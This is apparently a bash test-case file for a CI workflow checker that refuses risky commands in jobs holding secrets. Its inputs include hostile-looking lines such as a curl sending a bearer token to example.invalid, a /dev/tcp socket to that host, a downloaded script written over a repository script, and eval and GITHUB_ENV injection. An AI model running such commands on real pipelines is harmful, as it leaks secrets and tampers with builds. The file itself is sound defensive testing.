# shellcheck shell=bash disable=SC2016,SC2034,SC2154
# Cases for scripts/check-workflow-pins.sh: the programs a job beside a
# secret runs that are read by a reader of their own (cargo, git, gh, curl,
# sed, awk, find), the options of the filters, the files a script writes,
# Python and the values pasted into a script. Sourced by
# scripts/check-workflow-pins-tests.sh.

HELD_FILES=(scripts/check.sh 'echo checked')

# cargo builds from the lockfile, the package of the checkout, with its own
# subcommands.
held_case "a build without --locked beside a secret is refused" 1 "$HELD, line 7: cargo build without --locked" 'cargo build --release'
held_case "a publish without --locked beside a secret is refused" 1 "$HELD, line 7: cargo publish without --locked: it builds what the registry serves on the day, not the lockfile" 'cargo publish -p axess'
held_case "a metadata read without --locked beside a secret is refused" 1 "$HELD, line 7: cargo metadata without --locked" 'cargo metadata --format-version 1'
held_case "a publish with --locked among cargo's own flags passes" 0 "OK: every action" 'cargo --locked publish -p axess'
held_case "a publish with --frozen passes" 0 "OK: every action" 'cargo publish --frozen -p "$crate"'
held_case "a package with a quoted pattern passes" 0 "OK: every action" 'cargo package --workspace --exclude "axess-example-*" --locked'
free_case "a build without --locked in a job that holds nothing passes" 'cargo build --release'
held_case "a subcommand that rewrites the lockfile is refused" 1 "$HELD, line 7: cargo update, which changes the sources or the lockfile or is not needed beside a secret" 'cargo update' 'cargo publish --locked'
held_case "a subcommand that rewrites the sources is refused" 1 "$HELD, line 7: cargo fmt, which changes the sources" 'cargo fmt --all'
held_case "a manifest outside the repository is refused" 1 "$HELD, line 7: a cargo manifest the repository does not hold (\"\$RUNNER_TEMP/unpacked/Cargo.toml\")" 'cargo build --locked --manifest-path "$RUNNER_TEMP/unpacked/Cargo.toml"'
held_case "a manifest the repository does not hold, joined, is refused" 1 "$HELD, line 7: a cargo manifest the repository does not hold (--manifest-path=unpacked/Cargo.toml)" 'cargo run --locked --manifest-path=unpacked/Cargo.toml'
HELD_FILES=(tools/Cargo.toml '[package]')
held_case "a manifest the repository holds passes" 0 "OK: every action" 'cargo build --locked --manifest-path tools/Cargo.toml'
HELD_FILES=(scripts/check.sh 'echo checked')
held_case "an unstable cargo flag is refused" 1 "$HELD, line 7: a cargo flag that changes where or how it runs (-Zscript)" 'cargo -Zscript run --locked'
held_case "a directory cargo changes to is refused" 1 "$HELD, line 7: a cargo flag that changes where or how it runs (-C)" 'cargo -C unpacked build --locked'
held_case "a cargo argument from a variable is refused" 1 "$HELD, line 7: a cargo argument a variable fills in (\"\$EXTRA\")" 'cargo test --locked "$EXTRA"'
held_case "the value of a cargo option from a variable passes" 0 "OK: every action" 'cargo publish --locked -p "$crate" --features "$features"'
held_case "the arguments of the program cargo runs are its own" 0 "OK: every action" 'cargo run --locked --bin report -- "$EXTRA" --anything'
held_case "a build after a change of directory is refused" 1 "$HELD, line 7: cargo build after a change of directory: it builds the package it stands in" 'cd unpacked && cargo build --locked'

# git: the subcommands that run no program and write no file but the
# checkout's, in the job's own repository.
held_case "a git subcommand the check does not name is refused" 1 "$HELD, line 7: a git subcommand the check does not name (git frob)" 'git frob --now'
held_case "a git subcommand from a variable is refused" 1 "$HELD, line 7: a git subcommand from a variable (\"\$SUB\")" 'git "$SUB" origin'
held_case "git in another directory is refused" 1 "$HELD, line 7: git in another directory or repository (-C)" 'git -C "$RUNNER_TEMP/unpacked" status'
held_case "git on another repository is refused" 1 "$HELD, line 7: git in another directory or repository (--git-dir)" 'git --git-dir=unpacked/.git log -1'
held_case "git after a change of directory is refused" 1 "$HELD, line 8: git after a change of directory: it reads the settings of the repository it stands in" 'cd "$RUNNER_TEMP/unpacked"' 'git status'
held_case "a git option that writes a file is refused" 1 "$HELD, line 7: a git option that writes a file (--output=scripts/check.sh)" 'git diff --output=scripts/check.sh HEAD~1'
held_case "a shortened git option that writes a file is refused" 1 "$HELD, line 7: a git option that writes a file (--out=notes)" 'git log --out=notes -1'
MAY_BE_OPTION="that a variable fills in and that may be an option"
held_case "an argument of git fetch from a variable is refused" 1 "$HELD, line 7: an argument of git fetch $MAY_BE_OPTION (\"\$REMOTE\"): put it after --" 'git fetch "$REMOTE"'
held_case "the arguments of a function handed on to git push are refused" 1 "$HELD, line 7: an argument of git push $MAY_BE_OPTION (\"\$@\")" 'push() { git push "$@"; }' 'push origin main'
held_case "an argument of git ls-remote from an unquoted variable is refused" 1 "$HELD, line 7: an argument of git ls-remote $MAY_BE_OPTION (\$REMOTE)" 'git ls-remote $REMOTE'
held_case "an argument of git fetch after the end of options passes" 0 "OK: every action" 'git fetch origin -- "$REF"'
held_case "the release branch's git commands pass beside a secret" 0 "OK: every action" \
  'git fetch --no-tags origin "+refs/heads/main:refs/remotes/origin/main"' \
  'main=$(git rev-parse origin/main)' \
  'git merge-base --is-ancestor "$next" "$main" || [ "$(git rev-parse "$next^{tree}")" = "$(git rev-parse "$main^{tree}")" ]' \
  'git config user.name "github-actions[bot]"' \
  'git branch -f release/next "$main"' \
  'git checkout -b work "$next"' \
  'git merge --no-ff --no-edit -m "Merge main after ${TAG}" "$main" || git merge --abort' \
  'git -c "http.https://github.com/.extraheader=AUTHORIZATION: basic $auth" push --force-with-lease="refs/heads/release/next:$next" origin refs/heads/release/next:refs/heads/release/next' \
  'at=$(git ls-remote --tags origin "refs/tags/${TAG}")'
free_case "a git subcommand the check does not name in a job that holds nothing passes" 'git frob --now' 'git -C sub status'

# gh: the commands that call the API.
held_case "a gh command the check does not name is refused" 1 "$HELD, line 7: a gh command the check does not name (gh tool)" 'gh tool run'
held_case "a download of a release is refused" 1 "$HELD, line 7: a gh command the check does not name (gh release download)" 'gh release download v1.0.0'
held_case "a checkout of a pull request is refused" 1 "$HELD, line 7: a gh command the check does not name (gh pr checkout)" 'gh pr checkout 7'
held_case "a clone by gh is refused" 1 "$HELD, line 7: a gh command the check does not name (gh repo clone)" 'gh repo clone owner/repo'
held_case "a gh command from a variable is refused" 1 "$HELD, line 7: a gh command from a variable" 'gh "$COMMAND"'
held_case "the gh commands of the tag and watch jobs pass" 0 "OK: every action" \
  'gh api -X POST "repos/${GITHUB_REPOSITORY}/git/refs" -f ref="refs/tags/${TAG}" -f sha="${GITHUB_SHA}" >/dev/null' \
  'gh workflow run release.yml --repo "${GITHUB_REPOSITORY}" --ref "${TAG}"' \
  'existing=$(gh issue list --state open --search "\"$title\" in:title" --json number --jq ".[0].number // empty")' \
  'gh issue create --title "$title" --body "$body"' \
  'gh release upload "$TAG" target/package/axess.crate'

# curl: the options that write no file and read none for more options,
# its output into a temporary file, and an address of crates.io or GitHub,
# written out to its host or named by a variable the script set to such a
# text, or by the runner's own service URLs.
CURL="a curl option the check does not name"
held_case "a curl that writes a file into the checkout is refused" 1 "$HELD, line 7: a file curl writes outside the runner's temporary directory (tool)" 'curl -sSfL -o tool https://crates.io/api/v1/crates/axess'
held_case "a curl that writes a file by a cluster is refused" 1 "$HELD, line 7: a file curl writes outside the runner's temporary directory (tool)" 'curl -sSfLo tool https://crates.io/api/v1/crates/axess'
held_case "a curl that names its file after the address is refused" 1 "$HELD, line 7: $CURL (-O)" 'curl -O https://crates.io/api/v1/crates/axess'
held_case "a curl that reads its options from a file is refused" 1 "$HELD, line 7: $CURL (-K)" 'curl -K options https://crates.io/api/v1/crates/axess'
held_case "a curl output format that writes a file is refused" 1 "$HELD, line 7: a curl output format that is not written out, or that writes a file ('%output{notes}%{http_code}')" "curl -w '%output{notes}%{http_code}' https://crates.io/api/v1/crates/axess"
held_case "a curl output format from a variable is refused" 1 "$HELD, line 7: a curl output format that is not written out, or that writes a file (\"\$FORMAT\")" 'curl --write-out "$FORMAT" https://crates.io/api/v1/crates/axess'
held_case "a curl option a variable names is refused" 1 "$HELD, line 7: a curl address whose host is not written out (\"\$OPT\")" 'curl "$OPT" https://crates.io/api/v1/crates/axess'
held_case "a curl address from a variable is refused" 1 "$HELD, line 7: a curl address whose host is not written out (\"\$API/crates\")" 'curl --fail --silent "$API/crates"'
held_case "a curl address whose host an expansion ends is refused" 1 "$HELD, line 7: a curl address whose host is not written out (\"https://crates.io\$SUFFIX/x\")" 'curl "https://crates.io$SUFFIX/x"'
held_case "a curl address of another host is refused" 1 "$HELD, line 7: a curl address of a host the check does not name (example.invalid)" 'curl -fsS -H "Authorization: Bearer $TOKEN" https://example.invalid/upload'
held_case "a curl address of another host in a variable the script set is refused" 1 "$HELD, line 8: a curl address of a host the check does not name (example.invalid)" 'TOKENS_URL="https://example.invalid/api/v1/trusted_publishing/tokens"' 'curl --request POST --data-binary "@$RUNNER_TEMP/request.json" "$TOKENS_URL"'
held_case "a curl address a variable holds two hosts for is refused" 1 "$HELD, line 9: a curl address whose host is not written out (\"\$API/x\")" 'API=https://crates.io/api' 'if [ -n "$MIRROR" ]; then API=https://example.invalid/api; fi' 'curl "$API/x"'
held_case "a curl that follows a redirect with a header from a variable is refused" 1 "$HELD, line 7: a curl that follows a redirect with a header or a credential a variable fills in (\"Authorization: Bearer \$TOKEN\")" 'curl -fsSL -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/o/r'
held_case "a curl that follows a redirect with a credential from a variable is refused" 1 "$HELD, line 7: a curl that follows a redirect with a header or a credential a variable fills in (\"x-access-token:\$TOKEN\")" 'curl --location --user "x-access-token:$TOKEN" https://api.github.com/repos/o/r'
held_case "the curl of the upstream watch passes" 0 "OK: every action" 'USER_AGENT="axess-upstream-watch"' 'API="https://crates.io/api/v1"' 'curl --fail --silent --show-error --retry 3 --max-time 30 --user-agent "$USER_AGENT" --url "$API/$1" | jq -er .crate'
held_case "a curl with clustered options and a written address passes" 0 "OK: every action" 'curl -fsSL -H "Accept: application/json" https://api.github.com/repos/o/r | jq .'
held_case "a curl with a header from a variable that follows no redirect passes" 0 "OK: every action" 'curl -fsS -H"Authorization: Bearer $TOKEN" --output "$RUNNER_TEMP/answer.json" https://api.github.com/repos/o/r'
held_case "an exchange of an OIDC token for a crates.io token in the temporary directory passes" 0 "OK: every action" \
  'TOKENS_URL="https://crates.io/api/v1/trusted_publishing/tokens"' \
  'printf "Authorization: bearer %s\n" "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >"$RUNNER_TEMP/github.header"' \
  'status="$(curl --silent --show-error --max-time 30 --retry 2 --output "$RUNNER_TEMP/oidc.json" --write-out "%{http_code}" --header "@$RUNNER_TEMP/github.header" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=crates.io")"' \
  'jq -e "{jwt: .value}" "$RUNNER_TEMP/oidc.json" >"$RUNNER_TEMP/request.json"' \
  'curl --silent --request POST --header "Content-Type: application/json" --data-binary "@$RUNNER_TEMP/request.json" --output "$RUNNER_TEMP/exchange.json" "$TOKENS_URL"'
held_case "an exchange that writes under a directory of mktemp is refused" 1 "$HELD, line 8: a file a script writes outside the runner's temporary directory (\"\$WORK/github.header\")" 'WORK="$(mktemp -d)"' 'printf "Authorization: bearer %s\n" "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >"$WORK/github.header"'
held_case "a curl output under a directory of mktemp is refused" 1 "$HELD, line 8: a file curl writes outside the runner's temporary directory (\"\$WORK/oidc.json\")" 'WORK="$(mktemp -d)"' 'curl --output "$WORK/oidc.json" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=crates.io"'
held_case "a file a function writes at a path its parameter names is refused" 1 "$HELD, line 7: a file a script writes outside the runner's temporary directory (\"\$1.reason\")" 'reason() { printf "%s" "$2" >"$1.reason"; }' 'reason "$RUNNER_TEMP/exchange.json" refused'
# sed, awk and find write no file, and no operand of sed is an option.
held_case "a sed that edits in place is refused" 1 "$HELD, line 7: a sed command that edits a file in place" "sed -i 's/checked/changed/' scripts/check.sh" './scripts/check.sh'
held_case "a sed that edits in place by a long option is refused" 1 "$HELD, line 7: a sed command that edits a file in place" "sed --in-place=.bak 's/a/b/' Cargo.toml"
held_case "a sed program with the w command is refused" 1 "$HELD, line 7: a sed program that writes a file (the w command or flag)" "sed -n '/x/w scripts/check.sh' input"
held_case "a sed program with the w flag is refused" 1 "$HELD, line 7: a sed program that writes a file (the w command or flag)" "sed 's/a/b/w scripts/check.sh' input"
held_case "an operand of sed from a variable is refused" 1 "$HELD, line 7: an argument of sed $MAY_BE_OPTION (\"\$MANIFEST\"): put it after --" "sed -n '1p' \"\$MANIFEST\""
held_case "an operand of sed after the end of options passes" 0 "OK: every action" "sed -n -- '/^\\[workspace.package\\]/,/^\\[/p' \"\$MANIFEST\"" "sed -n '1p' -- \"\$MANIFEST\""
held_case "a sed program whose text holds a w passes" 0 "OK: every action" "sed -E 's/^(new|was) +//; s/wide/narrow/g' notes"
held_case "an awk program that writes a file is refused" 1 "$HELD, line 7: an awk program that writes a file (print > file)" "awk '{ print > \"scripts/check.sh\" }' input"
held_case "an awk program that appends to a file is refused" 1 "$HELD, line 7: an awk program that writes a file (print > file)" "awk '{ printf \"%s\\n\", \$1 >> \"notes\" }' input"
held_case "an awk program that compares passes" 0 "OK: every action" "awk -v start=\"\$n\" 'NR > start && /^## / { exit } NR > start { n++ } END { print n + 0 }' \"\$CHANGELOG\""
held_case "a find action that writes a file is refused" 1 "$HELD, line 7: a find action that writes a file (-fprint)" 'find . -name "*.rs" -fprint scripts/check.sh'
held_case "a find over the tree passes" 0 "OK: every action" 'find . -name "*.cdx.json" -not -path "./target/*" -print'

# A filter writes a file or runs a program only through the options
# listed beside it, and an operand from a variable may be one of them.
OPTION="that writes a file or runs a program"
held_case "a sort into a file is refused" 1 "$HELD, line 7: an option of sort $OPTION (-o)" 'sort -o scripts/check.sh input'
held_case "a sort into a file by a cluster is refused" 1 "$HELD, line 7: an option of sort $OPTION (-uo)" 'sort -uo sorted input'
held_case "a sort through a program is refused" 1 "$HELD, line 7: an option of sort $OPTION (--compress-program=./tool)" 'sort --compress-program=./tool input'
held_case "a sort through a program by a shortened option is refused" 1 "$HELD, line 7: an option of sort $OPTION (--comp=./tool)" 'sort --comp=./tool input'
held_case "an operand of sort from a variable is refused" 1 "$HELD, line 7: an argument of sort $MAY_BE_OPTION (\"\$LIST\"): put it after --" 'sort "$LIST"'
held_case "an operand of sort after the end of options passes" 0 "OK: every action" 'sort -u -- "$LIST"'
held_case "a base64 into a file is refused" 1 "$HELD, line 7: an option of base64 $OPTION (-o)" 'base64 -d -o scripts/check.sh input'
held_case "a uniq into a file is refused" 1 "$HELD, line 7: a file uniq writes (its second operand)" 'uniq input scripts/check.sh'

# A script writes to the runner's own files, a device, or a file of the
# runner's temporary directory: a file in the checkout is one a later
# command may run or cargo may build.
WRITES="a file a script writes outside the runner's temporary directory"
held_case "a script written over a repository script is refused" 1 "$HELD, line 7: $WRITES (scripts/check.sh)" 'curl -sSf https://crates.io/check.sh > scripts/check.sh' './scripts/check.sh'
held_case "a here-document into a build script is refused" 1 "$HELD, line 7: $WRITES (axess/build.rs)" 'cat > axess/build.rs <<EOF' 'fn main() {}' 'EOF'
held_case "a file appended to in the checkout is refused" 1 "$HELD, line 7: $WRITES (Cargo.toml)" 'echo "[patch.crates-io]" >> Cargo.toml'
held_case "both outputs into a file are refused" 1 "$HELD, line 7: $WRITES (log)" 'cargo publish --locked &> log'
held_case "a file opened for reading and writing is refused" 1 "$HELD, line 7: $WRITES (/dev/tcp/example.invalid/80)" 'exec 3<>/dev/tcp/example.invalid/80'
held_case "a file from a variable is refused" 1 "$HELD, line 7: $WRITES (\"\$OUT\")" 'echo done > "$OUT"'
held_case "a file above the temporary directory is refused" 1 "$HELD, line 7: $WRITES (\"\$RUNNER_TEMP/../work/build.rs\")" 'echo x > "$RUNNER_TEMP/../work/build.rs"'
held_case "a file under the home directory is refused" 1 "$HELD, line 7: $WRITES (\"\$HOME/.cargo/bin/cargo\")" 'cat tool > "$HOME/.cargo/bin/cargo"'
held_case "the runner's files, the devices and the temporary directory pass" 0 "OK: every action" \
  'echo "tag=$GITHUB_REF_NAME" >> "$GITHUB_OUTPUT"' \
  'echo "## Published" >> "${GITHUB_STEP_SUMMARY}"' \
  'echo "warning" >&2; cargo publish --locked 2>&1 >/dev/null; echo x 2>/dev/null 1>&2' \
  '(cd target/package && sha256sum -- *.crate) > "$RUNNER_TEMP/packaged-here.sha256"' \
  'echo x >> "${RUNNER_TEMP}/notes/log" &> /dev/null'
free_case "a file written into the checkout in a job that holds nothing passes" 'echo done > notes' 'sort -o sorted input'

# A Python program is read for cargo install alone.
HELD_FILES=(scripts/report.py 'print("report")' scripts/report.sh 'python3 -I scripts/report.py')
held_case "a Python program in the script is refused" 1 "$HELD, line 7: a Python program (python3): it is read for cargo install alone" "python3 -c 'import json'"
held_case "a Python script of the repository is refused" 1 "$HELD, scripts/report.py line 1: a Python program: it is read for cargo install alone" 'python3 -I scripts/report.py'
held_case "a Python script of the repository run by its path is refused" 1 "$HELD, scripts/report.py line 1: a Python program" './scripts/report.py'
held_case "a Python program a repository script runs is refused" 1 "$HELD, scripts/report.sh line 1: a Python program (python3)" './scripts/report.sh'
free_case "a Python program in a job that holds nothing passes" "python3 -c 'import json'" 'python3 -I scripts/report.py'
HELD_FILES=(scripts/check.sh 'echo checked')

# A script one shell fills in for another is a paste like an expression
# the runner fills in: the value of a variable in the text of `sh -c`, `eval`, `trap` or a here-document a
# shell reads becomes commands of the inner script.
PASTED_VALUE="a value pasted into the script"
held_case "a variable in the text of sh -c beside a secret is refused" 1 "$HELD, line 7: $PASTED_VALUE sh -c runs: the shell that runs it reads the value as commands" 'sh -c "gh release view $TAG"'
held_case "a variable in the text of eval beside a secret is refused" 1 "$HELD, line 7: $PASTED_VALUE eval runs" 'eval "version=$VALUE"'
held_case "a variable in the text of a trap beside a secret is refused" 1 "$HELD, line 7: $PASTED_VALUE trap runs" 'trap "rm -rf $WORK" EXIT'
held_case "a variable in a here-document a shell reads beside a secret is refused" 1 "$HELD, line 7: $PASTED_VALUE bash reads from a here-document" 'bash <<EOF' 'gh release view $TAG' 'EOF'
held_case "a variable in a here-string a shell reads beside a secret is refused" 1 "$HELD, line 7: $PASTED_VALUE bash runs" 'bash <<< "gh release view $TAG"'
held_case "a variable the inner shell reads in single quotes passes" 0 "OK: every action" "sh -c 'gh release view \"\$TAG\"'" "trap 'rm -rf \"\$WORK\"' EXIT"
held_case "a here-document with a quoted delimiter a shell reads passes" 0 "OK: every action" "bash <<'EOF'" 'gh release view "$TAG"' 'EOF'
free_case "a variable in the text of sh -c in a job that holds nothing passes" 'sh -c "gh release view $TAG"'

# A value written to $GITHUB_ENV sets a variable for the later steps, and
# a line break in it sets another one.
ENV_VALUE="a value from a variable written to \$GITHUB_ENV"
held_case "a value from a variable written for the later steps beside a secret is refused" 1 "$HELD, line 7: $ENV_VALUE (PCT): a line break in it sets another variable" 'echo "PCT=$pct" >> "$GITHUB_ENV"'
held_case "a value from a variable written by printf beside a secret is refused" 1 "$HELD, line 7: $ENV_VALUE (VERSION)" 'printf "VERSION=%s\n" "$v" >> "$GITHUB_ENV"'
held_case "a value written out for the later steps passes beside a secret" 0 "OK: every action" 'echo "CARGO_TERM_COLOR=always" >> "$GITHUB_ENV"'
free_case "a value from a variable written for the later steps in a job that holds nothing passes" 'echo "PCT=$pct" >> "$GITHUB_ENV"'

# The build script of a dependency runs the compiler, the archiver or
# pkg-config a variable names, and loads the libclang one points at.
BUILD_VARIABLE="a variable by which a build script finds a program to run"
held_case "a C compiler named for a build beside a secret is refused" 1 "$HELD, line 7: $BUILD_VARIABLE (CC)" 'CC=tools/cc cargo publish --locked'
held_case "an exported pkg-config beside a secret is refused" 1 "$HELD, line 7: $BUILD_VARIABLE (PKG_CONFIG)" 'export PKG_CONFIG=tools/pkg-config'
held_case "a compiler for one target beside a secret is refused" 1 "$HELD, line 7: $BUILD_VARIABLE (CC_x86_64_unknown_linux_gnu)" 'env CC_x86_64_unknown_linux_gnu=tools/cc cargo build --locked'
free_case "a C compiler named for a build in a job that holds nothing passes" 'CC=clang cargo build --locked'
for place in "env:
  LIBCLANG_PATH: tools/lib
jobs:
  a:
    env:
      TOKEN: \${{ secrets.TOKEN }}
    steps:
      - run: cargo publish --locked" "jobs:
  a:
    env:
      TOKEN: \${{ secrets.TOKEN }}
      LIBCLANG_PATH: tools/lib
    steps:
      - run: cargo publish --locked" "jobs:
  a:
    env:
      TOKEN: \${{ secrets.TOKEN }}
    steps:
      - env:
          LIBCLANG_PATH: tools/lib
        run: cargo publish --locked"; do
  case_ "a libclang named in an env beside a secret is refused" 1 "$HELD, line $(printf '%s\n' "$place" | grep -n LIBCLANG_PATH | cut -d: -f1): $BUILD_VARIABLE (LIBCLANG_PATH)" e.yml "$place"
done
case_ "a C compiler named in the env of another job passes" 0 "OK: every action" e.yml "jobs:
  build:
    env:
      CC: clang
    steps:
      - run: cargo build --locked
  publish:
    env:
      TOKEN: \${{ secrets.TOKEN }}
    steps:
      - run: cargo publish --locked"
